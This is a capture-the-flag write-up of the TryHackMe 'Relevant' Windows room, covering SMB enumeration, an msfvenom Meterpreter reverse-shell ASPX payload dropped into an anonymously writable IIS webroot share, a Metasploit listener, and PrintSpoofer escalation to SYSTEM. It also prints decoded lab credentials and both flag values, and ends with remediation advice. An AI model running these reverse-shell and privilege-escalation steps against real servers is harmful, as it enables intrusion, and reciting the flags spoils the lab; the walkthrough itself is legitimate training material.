<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:B91C1C,100:1A1A2E&height=220&section=header&text=TryHackMe%20-%20Relevant&fontSize=50&fontColor=ffffff" width="100%"/>
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com/?font=Fira+Code&weight=600&size=24&pause=1000&color=B91C1C&center=true&vCenter=true&width=700&lines=Enumerate+%E2%86%92+Exploit+%E2%86%92+Escalate+%E2%86%92+Root;Anonymous+SMB+Share+Hidden+Inside+IIS+Webroot;SeImpersonatePrivilege+Abused+with+PrintSpoofer;Full+SYSTEM+Compromise+in+One+Attack+Chain" alt="Typing SVG" />
</p> 

<p align="center">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Windows_Server-blue?style=for-the-badge&logo=windows&logoColor=white">
  <img src="https://img.shields.io/badge/Category-IIS%20%7C%20SMB%20%7C%20PrivEsc-lightgrey?style=for-the-badge">
  <img src="https://img.shields.io/badge/Status-Rooted%20%E2%9C%85-brightgreen?style=for-the-badge">
</p>

<h3 align="center">👤 Author: <b>Nishant Saini</b> &nbsp;|&nbsp; 🎯 Room: <a href="https://tryhackme.com/room/relevant">Relevant</a></h3>

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=rect&color=0:1A1A2E,100:B91C1C&height=3&width=100%"/>
</p>

---

## 📖 About This Write-up

**Relevant** is a medium-difficulty Windows machine on TryHackMe that looks intimidating at first glance — a locked-down looking IIS server with RDP enabled and no obvious web application — but collapses almost entirely because of **one classic misconfiguration**: an SMB share that was never meant to be reachable anonymously, sitting physically inside the IIS web root directory.

That one mistake is enough to go from *zero access* to a *fully interactive reverse shell* in a matter of minutes, and a leftover Windows token privilege (`SeImpersonatePrivilege`) on the IIS service account is enough to go from a *low-privileged web shell* all the way to `NT AUTHORITY\SYSTEM`.

This write-up documents the **entire thought process**, not just the commands — *why* each step was taken, *what* it revealed, and *how* each small clue (an open port, a weird share name, a Base64 string, a token privilege) was pieced together into a complete compromise.

> 💡 This is a long, detailed walkthrough meant for learning. If you're stuck on this room yourself, try to reach each checkpoint on your own first before reading the corresponding section.

---

## 📜 Table of Contents

1. [Lab & Network Setup](#-0-lab--network-setup)
2. [Reconnaissance](#-1-reconnaissance)
3. [SMB Share Enumeration](#-2-smb-share-enumeration)
4. [Credential Decoding](#-3-credential-decoding)
5. [Exploitation — Building & Delivering the Payload](#-4-exploitation--building--delivering-the-payload)
6. [Gaining Access — Meterpreter Shell](#-5-gaining-access--meterpreter-shell)
7. [User Flag](#-6-user-flag)
8. [Privilege Escalation — Theory](#-7-privilege-escalation--understanding-the-vector)
9. [Privilege Escalation — Practice](#-8-privilege-escalation--exploitation)
10. [Root Flag](#-9-root-flag)
11. [Attack Chain Summary](#-attack-chain-summary)
12. [Lessons Learned / Remediation](#-lessons-learned--remediation)
13. [Tools Used](#-tools-used)
14. [Flags](#-flags)
15. [Screenshots Gallery](#-screenshots-gallery)

---

## 🖥 0. Lab & Network Setup

Before touching the target, the TryHackMe AttackBox (Kali-based) was connected to the room's VPN network. All traffic below originates from the attacker IP `192.168.130.136` / `10.145.x.x` range against the target IP assigned by the room (`10.145.170.31` / `10.144.153.62` depending on the instance spin-up).

Nothing fancy here — just a standard Kali box with the usual suite preinstalled: `nmap`, `smbclient`, `metasploit-framework`, `curl`, `wget`. CyberChef was used from the browser for decoding, since it's faster than scripting a one-off Base64 decode.

---

## 🔍 1. Reconnaissance

### 1.1 Full Port Scan

The very first move on *any* box is a full TCP port sweep — never trust the "top 1000 ports" default scan on a box designed to teach a lesson, because the interesting service is often sitting on a non-standard port, or the default scan just won't show banner/version info clearly enough.

```bash
nmap -sC -sV -p- --min-rate 5000 -T4 10.145.170.31
```

Breaking the flags down:
- `-sC` → run Nmap's default safe NSE scripts (banner grabs, some enum)
- `-sV` → service/version detection
- `-p-` → scan **all 65535** ports, not just the common 1000
- `--min-rate 5000` → fire packets fast, since this is a lab environment and speed matters more than stealth
- `-T4` → aggressive timing template

**Results:**

| Port  | Service       | Notes                                                  |
|-------|---------------|----------------------------------------------------------|
| 80    | HTTP (IIS)    | Default IIS welcome page — no visible custom app          |
| 135   | MSRPC         | Standard Windows RPC endpoint mapper                       |
| 139   | NetBIOS-SSN   | Legacy NetBIOS session service, tied to SMB                |
| 445   | Microsoft-DS  | Modern SMB over TCP                                         |
| 3389  | RDP           | Valid self-signed cert, `commonName=Relevant` — confirms hostname |
| 49663 / 49666 / 49667 | RPC (dynamic) | High ephemeral ports opened by RPC services at runtime |

> 🟡 **Why this combination matters:** Seeing **IIS (80)** running *alongside* **SMB (139/445)** on the exact same host is the single biggest tell in this whole box. On a lot of real-world (and CTF) Windows web servers, administrators sometimes expose an SMB share for "easy file transfer" to the webroot, completely forgetting that SMB's own permission model is now effectively *also* the web server's permission model. If that share allows anonymous write access, it's exactly as dangerous as an open file-upload vulnerability on the website itself.

### 1.2 Web Enumeration

A manual browse to `http://<target-ip>/` on port 80 returns nothing but the **stock IIS "Welcome" splash page** — the one every fresh IIS install ships with, featuring the multi-language "Welcome" tiles.

No custom virtual directories were visible from the homepage itself, no visible links, no robots.txt of interest. This is a strong signal that whatever application exists on this box is either not yet deployed to the default site, or reachable through a path that isn't linked from the homepage — which is exactly why the SMB share angle becomes so important in the next section.

---

## 📂 2. SMB Share Enumeration

### 2.1 Listing Shares

`smbclient -L` is the standard way to list available shares on a remote SMB server. The very first attempts here are worth including precisely because they **fail** — this is realistic, and the failure itself is informative:

```bash
smbclient -L \\10.144.153.62
smbclient -L \\\\10.144.153.62\\nt4wrksv
```

These throw `NT_STATUS_RESOURCE_NAME_NOT_FOUND` and `Unable to connect with SMB1 — no workgroup available` type errors. This happens because modern Samba clients try newer SMB dialect negotiation by default, while a deliberately old/vulnerable target (as many CTF boxes are) still speaks the legacy **SMB1** protocol for backward-compatibility testing purposes — the negotiation step for *listing the workgroup* can fail even while individual *share* connections still work fine.

Despite the errors, the share list still partially printed before failing, and it revealed four shares:

```
ADMIN$     Disk    Remote Admin
C$         Disk    Default share
IPC$       IPC     Remote IPC
nt4wrksv   Disk     ← non-default, custom share!
```

The first three (`ADMIN$`, `C$`, `IPC$`) are **default administrative shares** present on every Windows install — not usually accessible without admin credentials. `nt4wrksv`, however, is **not a default share name** — someone created this deliberately, which makes it the obvious point of interest.

### 2.2 Connecting Directly to the Share

Instead of fighting the full server-wide listing (which kept failing on the workgroup step), the smarter move is to connect **directly** to the share that's already been identified, skipping the problematic listing entirely:

```bash
smbclient //10.144.153.62/nt4wrksv -N
```

The `-N` flag tells `smbclient` to attempt a **null/anonymous session** — no username or password. This connects successfully, confirming the share allows anonymous access. Inside:

```
smb: \> ls
  .                                     D        0  ...
  ..                                    D        0  ...
  passwords.txt                        A       98  ...

smb: \> get passwords.txt
```

A single file, `passwords.txt`, was present and downloaded to the local attacking machine for offline analysis.

> 🟢 **Checkpoint reached:** Anonymous **read** access confirmed on a custom share. The next question — which turns out to matter a lot more — is whether this share also allows **write** access.

---

## 🔐 3. Credential Decoding

Opening the downloaded `passwords.txt` reveals:

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG4yMDY5Njk2OSEkJCQ=
```

Both strings end in `=` padding characters, and the character set (`A-Za-z0-9+/=`) is a textbook signature of **Base64 encoding**. Importantly — Base64 is **not encryption**. It's a reversible encoding scheme meant for safely representing binary data as text; anyone can decode it instantly with zero "cracking" required.

Using [CyberChef](https://gchq.github.io/CyberChef/) with the **"From Base64"** operation (alphabet `A-Za-z0-9+/=`, default settings):

| Encoded String | Decoded Result |
|---|---|
| `Qm9iIC0gIVBAJCRXMHJEITEyMw==` | `Bob - !P@$$W0rD!123` |
| `QmlsbCAtIEp1dzRubmFNNG4yMDY5Njk2OSEkJCQ=` | `Bill - Juw4nnaM4n420696969!$$$` |

So two local account credentials are now in hand:

| Username | Password |
|---|---|
| `Bob`  | `!P@$$W0rD!123` |
| `Bill` | `Juw4nnaM4n420696969!$$$` |

These credentials are genuinely useful (they could be used for RDP, SMB auth, or WinRM in a different attack path on this box), but in this particular run they ended up being a **backup option** — because testing showed the `nt4wrksv` share also allowed **anonymous write access**, which opens up a much faster route to code execution, covered next.

---

## 💣 4. Exploitation — Building & Delivering the Payload

### 4.1 Why This Share Is Dangerous

A bit of path probing (and knowledge of common IIS default layouts) confirms that `nt4wrksv` physically lives at:

```
C:\inetpub\wwwroot\nt4wrksv\
```

`C:\inetpub\wwwroot\` is the **default IIS web root**. Anything placed inside `nt4wrksv` is therefore not just sitting on a file share — it's sitting inside a web-accessible directory, reachable over HTTP at a URL like:

```
http://<target-ip>:<port>/nt4wrksv/<filename>
```

Combine that with **anonymous write access** over SMB, and the picture is clear: any file uploaded through SMB can be *immediately executed* by the web server simply by requesting its URL. If that file happens to be a server-side script IIS knows how to execute (`.aspx`, `.asp`), this is a direct path to **Remote Code Execution**.

### 4.2 Generating a Malicious ASPX Payload

`msfvenom` is used to generate a Meterpreter reverse-shell payload, wrapped in a valid `.aspx` file so IIS will happily parse and execute it as a server-side page:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  lhost=192.168.130.136 lport=4444 -f aspx -o shell.aspx
```

- `-p windows/x64/meterpreter_reverse_tcp` → 64-bit Windows Meterpreter stager, connecting *back* to the attacker (reverse shell, avoiding inbound-firewall issues on the target)
- `lhost` / `lport` → attacker's listening IP and port
- `-f aspx` → output format: a ready-to-drop ASPX web page containing the shellcode
- `-o shell.aspx` → output filename

This produced a **1,292,296-byte** `shell.aspx` file (the raw 64-bit payload wrapped in a .NET-compatible loader stub is relatively large compared to a 32-bit payload, but size is irrelevant for the attack).

### 4.3 Delivering the Payload via SMB

With write access already confirmed, the payload is simply dropped onto the share:

```bash
smbclient //10.144.153.62/nt4wrksv -N
smb: \> put shell.aspx
```

The upload succeeds instantly — `shell.aspx` now sits inside the live IIS web root, waiting to be requested.

### 4.4 Preparing to Catch the Callback

Before triggering anything, a **listener** has to be ready on the attacker side to catch the reverse connection the payload will make. Metasploit's generic `multi/handler` module is configured to match the exact payload type, LHOST, and LPORT used during payload generation:

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.130.136
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

This starts listening and blocks, waiting for the target to connect back.

### 4.5 Triggering Execution

The payload only runs the moment IIS is asked to *serve* it. A simple HTTP request is enough:

```bash
curl http://10.144.153.62:49663/nt4wrksv/shell.aspx
```

(Port numbers on this particular box can vary between RPC-assigned dynamic ports and the standard 80, depending on how the virtual directory was mapped — both were tested during the engagement, and the share's own listening port worked.)

The instant IIS parses and executes this page server-side, the embedded shellcode runs under the **IIS worker process's** identity, and a connection is sent back to the waiting Metasploit handler.

---

## 🐚 5. Gaining Access — Meterpreter Shell

The handler catches the callback and a full **Meterpreter session** opens, landing inside the IIS process's working directory:

```
[*] Meterpreter session 1 opened (192.168.130.136:4444 -> 10.144.153.62:xxxxx)

meterpreter > ls
Listing: c:\windows\system32\inetsrv
```

With code execution confirmed, the entire filesystem is searched for `.txt` files — a fast way to locate flag files without manually browsing every user folder:

```
meterpreter > cd C:/users
meterpreter > search -f *.txt
```

Out of **174 results**, one stands out immediately:

```
c:\Users\Bob\Desktop\user.txt
```

This lines up directly with the `Bob` account discovered earlier in the decoded credentials — confirming this is indeed the intended target file for the low-privilege flag.

---

## 🚩 6. User Flag

```
meterpreter > cd C:/Users/Bob/Desktop
meterpreter > ls
meterpreter > cat user.txt
```

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

✅ **User flag captured.** At this point, access is confirmed as the IIS application pool identity (not yet `Bob` or an admin) — still a low-privileged context, but enough to read files wherever that identity has permission, which apparently includes Bob's desktop folder.

---

## ⬆️ 7. Privilege Escalation — Understanding the Vector

Before blindly running tools, it's worth checking **what privileges the current token actually has**. On Windows, a process can run as a low-privileged *user* but still hold powerful **token privileges** inherited from how the service was configured — and IIS application pool identities are a textbook example of this.

A privilege check on the current session reveals (among others):

```
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege      ← the important one
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

**`SeImpersonatePrivilege`** is the privilege that lets a process impersonate the security context of another user/token after receiving one — normally used legitimately by services like IIS or MSSQL that need to act "as" a client temporarily. The problem: if an attacker can get *any* privileged token to flow to a process they control (even briefly), `SeImpersonatePrivilege` lets them **clone it and run code as that identity** — including `SYSTEM`.

This is the exact privilege abused by the well-known **"Potato" family of exploits** (RottenPotato, JuicyPotato, RoguePotato, PrintSpoofer, GodPotato, etc.), all of which trick a SYSTEM-level Windows service into connecting back through a named pipe the attacker controls, handing over a SYSTEM token in the process.

**PrintSpoofer** specifically abuses the **Print Spooler service**: it forces the spooler (which runs as SYSTEM) to connect to an attacker-controlled named pipe, captures the resulting SYSTEM token via impersonation, and uses `CreateProcessAsUser()` to spawn a new process running fully as `NT AUTHORITY\SYSTEM`.

---

## 🧨 8. Privilege Escalation — Exploitation

### 8.1 Fetching PrintSpoofer

The compiled PrintSpoofer64 binary is downloaded directly from its GitHub releases page onto the attacking Kali machine:

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

### 8.2 Delivering It the Same Way as the Shell

Since the writable SMB share worked perfectly for the first payload, it's reused to stage the privesc tool too — no need to find a new transfer method:

```bash
smbclient //10.144.153.62/nt4wrksv -N
smb: \> put PrintSpoofer64.exe
```

`PrintSpoofer64.exe` (27,136 bytes) now sits alongside `shell.aspx` and `passwords.txt` inside the web root, ready to be executed from within the Meterpreter/shell session.

### 8.3 Catching a Fresh Session & Verifying the Tool

The web shell is re-triggered (same `curl` technique as before) to catch a brand-new session, since the original one had dropped. From the fresh shell, dropping into a native Windows shell and listing the directory confirms everything is staged correctly:

```
c:\inetpub\wwwroot\nt4wrksv> dir
  passwords.txt
  PrintSpoofer64.exe
  shell.aspx
```

### 8.4 Running PrintSpoofer

```
c:\inetpub\wwwroot\nt4wrksv> PrintSpoofer64.exe -i -c powershell.exe
```

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

The `-i` flag runs interactively, and `-c powershell.exe` specifies which process to spawn with the captured SYSTEM token. Within seconds, a fully privileged PowerShell prompt appears.

---

## 👑 9. Root Flag

A quick sanity check confirms the escalation actually worked:

```
PS C:\Windows\system32> whoami
nt authority\system
```

From here, it's a straight walk to the Administrator's desktop:

```
PS C:\Windows\system32> cd \users\administrator\desktop
PS C:\users\administrator\desktop> dir
  root.txt

PS C:\users\administrator\desktop> cat root.txt
```

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

🏆 **Root flag captured — full system compromise achieved.**

---

## 🔗 Attack Chain Summary

```
 Nmap (80 + 445 open)
        │
        ▼
 smbclient → anonymous access to custom share "nt4wrksv"
        │
        ├──► passwords.txt → Base64 decode (CyberChef) → Bob / Bill creds (backup path)
        │
        ▼
 Share is anonymously WRITABLE + lives inside C:\inetpub\wwwroot\
        │
        ▼
 msfvenom → shell.aspx (Meterpreter reverse TCP) → uploaded via SMB
        │
        ▼
 curl the URL → IIS executes shell.aspx → Meterpreter session (IIS identity)
        │
        ▼
 search -f *.txt → user.txt found → USER FLAG 🚩
        │
        ▼
 Token check → SeImpersonatePrivilege enabled
        │
        ▼
 PrintSpoofer64.exe uploaded via SMB → executed → SYSTEM token captured
        │
        ▼
 whoami → nt authority\system → root.txt → ROOT FLAG 👑
```

---

## 🛡 Lessons Learned / Remediation

| # | Issue | Fix |
|---|---|---|
| 1 | Anonymous (null-session) SMB access allowed | Disable null sessions; require authentication on all shares |
| 2 | Writable share physically inside the IIS web root | Never co-locate file-transfer shares with web-servable directories |
| 3 | Plaintext/Base64 "encoded" credentials stored on a share | Never store credentials in files; use a proper secrets manager; remember encoding ≠ encryption |
| 4 | `SeImpersonatePrivilege` present on the IIS service account | Strip unnecessary token privileges from service accounts; apply least-privilege principles |
| 5 | No alerting on `w3wp.exe` spawning `cmd.exe` / `powershell.exe` | Deploy EDR/SIEM rules to flag abnormal parent-child process relationships |

---

## 🧰 Tools Used

| Tool | Purpose |
|---|---|
| [Nmap](https://nmap.org/) | Port & service enumeration |
| [smbclient](https://www.samba.org/) | SMB share enumeration, download & upload |
| [CyberChef](https://gchq.github.io/CyberChef/) | Base64 decoding of leaked credentials |
| [Metasploit Framework](https://www.metasploit.com/) | Payload generation (`msfvenom`) & listener (`multi/handler`) |
| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | `SeImpersonatePrivilege` → SYSTEM privilege escalation |

---

## 📌 Flags

| Flag | Value |
|---|---|
| 🚩 User | `THM{fdk4ka34vk346ksxfr21tg789ktf45}` |
| 👑 Root | `THM{1fk5kf469devly1gl320zafgl345pv}` |

---

<p align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=0:1A1A2E,100:B91C1C&height=120&section=footer"/>
</p>

<p align="center"><i>Write-up by <b>Nishant Saini</b> — for educational purposes only, completed as part of the TryHackMe "Relevant" room.</i></p>
